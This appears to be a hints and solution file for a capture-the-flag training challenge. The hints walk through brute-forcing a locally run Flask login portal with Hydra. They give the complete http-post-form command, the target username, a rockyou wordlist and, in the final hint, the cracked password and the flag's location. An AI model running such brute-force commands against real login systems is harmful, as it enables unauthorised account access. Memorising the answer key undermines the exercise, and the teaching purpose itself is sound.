# Day 3 Hints - Workshop Portal Attack

**Stuck?** Here are progressive hints to help you solve this challenge.

---

## Hint 1: Getting Started (Hydra Installation)

<details>
<summary>Click to reveal Hint 1</summary>

Make sure you have Hydra installed:

**Kali Linux / Parrot OS:**
```bash
# Already installed!
hydra -h
```

**Ubuntu / Debian / WSL:**
```bash
sudo apt update
sudo apt install hydra -y
```

**macOS:**
```bash
brew install hydra
```

**Verify installation:**
```bash
hydra -h
# Should show Hydra help menu
```

</details>

---

## Hint 2: Starting the Workshop Portal

<details>
<summary>Click to reveal Hint 2</summary>

You need to run the Workshop Portal web application first:

1. Navigate to the artifacts folder:
```bash
cd day03/artifacts/
```

2. Install Flask (if not already installed):
```bash
pip3 install flask
```

3. Run the portal:
```bash
python3 workshop_portal.py
```

You should see:
```
* Running on http://127.0.0.1:5000
* Serving Workshop Portal login
```

**Keep this terminal open!** The portal needs to be running for Hydra to attack it.

Open a new terminal for the next steps.

</details>

---

## Hint 3: Understanding the Target

<details>
<summary>Click to reveal Hint 3</summary>

**What you know:**
- **Username:** `elf_admin_backup` (discovered in Day 2)
- **Target URL:** `http://127.0.0.1:5000/login`
- **Wordlist:** `rockyou-top1000.txt` (in artifacts folder)

**What you need to find:**
- The password

The password is somewhere in the wordlist. Hydra will test each one until it finds the right password.

</details>

---

## Hint 4: Basic Hydra Syntax

<details>
<summary>Click to reveal Hint 4</summary>

Hydra syntax for HTTP POST form attacks:

```bash
hydra -l USERNAME -P WORDLIST TARGET_IP http-post-form "PATH:PARAMS:FAILURE_STRING"
```

**Breaking it down:**
- `-l USERNAME` = single username to test
- `-P WORDLIST` = path to password wordlist file
- `TARGET_IP` = IP address or hostname (127.0.0.1 for local)
- `http-post-form` = attack type (HTTP POST login form)
- `"PATH:PARAMS:FAILURE_STRING"` = form details (path, parameters, failure message)

</details>

---

## Hint 5: Finding Form Details

<details>
<summary>Click to reveal Hint 5</summary>

You need to know how the login form works. Open the portal in a browser:

```
http://127.0.0.1:5000/login
```

Try logging in with wrong credentials and watch what happens.

**What you need:**
- **Login path:** `/login`
- **Username parameter name:** `username`
- **Password parameter name:** `password`
- **Failure message:** What text appears when login fails? (Look for "Invalid" or "Failed")

</details>

---

## Hint 6: Building the Hydra Command

<details>
<summary>Click to reveal Hint 6</summary>

Here's the structure. Fill in the blanks:

```bash
hydra -l elf_admin_backup -P rockyou-top1000.txt 127.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

**Explanation:**
- `-l elf_admin_backup` = username (from Day 2)
- `-P rockyou-top1000.txt` = wordlist file
- `127.0.0.1` = localhost (where the portal is running)
- `/login` = login form path
- `username=^USER^&password=^PASS^` = form parameters (^USER^ and ^PASS^ are placeholders Hydra fills in)
- `Invalid credentials` = text that appears when login fails

**Note:** Make sure you're in the `day03/artifacts/` directory where the wordlist is located!

</details>

---

## Hint 7: Running the Attack

<details>
<summary>Click to reveal Hint 7</summary>

If you've built the command correctly, run it:

```bash
cd /path/to/day03/artifacts/
hydra -l elf_admin_backup -P rockyou-top1000.txt 127.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

You'll see Hydra testing passwords:
```
[ATTEMPT] target 127.0.0.1 - login "elf_admin_backup" - pass "password"
[ATTEMPT] target 127.0.0.1 - login "elf_admin_backup" - pass "123456"
[ATTEMPT] target 127.0.0.1 - login "elf_admin_backup" - pass "12345678"
```

Wait for the `[5000][http-post-form] host: 127.0.0.1   login: elf_admin_backup   password: XXXXXXXX` success message!

</details>

---

## Hint 8: What to Do After Cracking the Password

<details>
<summary>Click to reveal Hint 8</summary>

Once Hydra finds the password, you need to actually **login** to the Workshop Portal:

1. Open browser: `http://127.0.0.1:5000/login`
2. Enter:
   - **Username:** `elf_admin_backup`
   - **Password:** (the password Hydra found)
3. Click "Login"

You'll be redirected to the Admin Dashboard.

**The flag is NOT the password!** The flag is somewhere in the admin dashboard.

</details>

---

## Hint 9: Finding the Flag in the Dashboard

<details>
<summary>Click to reveal Hint 9</summary>

Once logged into the admin dashboard, look around:

- Check the welcome message
- Look for "Security Logs" or "Incident Reports" section
- Click on any links or buttons
- Read the incident report documents

The flag will be in the format: `FROST{...}`

It's hidden in one of the incident reports that Jack Frost accessed.

</details>

---

## Hint 10: Full Solution (Last Resort)

<details>
<summary>Click to reveal FULL SOLUTION</summary>

### Step-by-Step Solution:

**1. Start the Workshop Portal:**
```bash
cd day03/artifacts/
python3 workshop_portal.py
# Keep this running in one terminal
```

**2. Open a new terminal and run Hydra:**
```bash
cd day03/artifacts/
hydra -l elf_admin_backup -P rockyou-top1000.txt 127.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

**3. Wait for Hydra to find the password:**
```
[5000][http-post-form] host: 127.0.0.1   login: elf_admin_backup   password: snowflake2024
```

**4. Login to the portal:**
- Open browser: `http://127.0.0.1:5000/login`
- Username: `elf_admin_backup`
- Password: `snowflake2024`

**5. Access Admin Dashboard:**
- Navigate to "Security Logs"
- Open "Incident Report - December 14"

**6. Get the flag:**
The incident report contains the flag in `FROST{...}` format. You'll see it when you access the report!

</details>

---

## Still Stuck?

Common issues:

**Hydra says "Connection refused"**
- Make sure the Workshop Portal is running (`python3 workshop_portal.py`)
- Check that it's running on port 5000

**Hydra is too slow**
- The wordlist only has 1000 entries, should finish in 1-2 minutes
- You can add `-t 4` for 4 parallel tasks: `hydra -t 4 -l ...`

**Can't install Hydra**
- Try updating package lists first: `sudo apt update`
- On macOS, make sure Homebrew is installed

**Portal won't start**
- Install Flask: `pip3 install flask`
- Check Python version: `python3 --version` (needs Python 3.6+)

---

**Remember:** The goal is to learn how brute force attacks work, not just to get the flag. Understand each step!
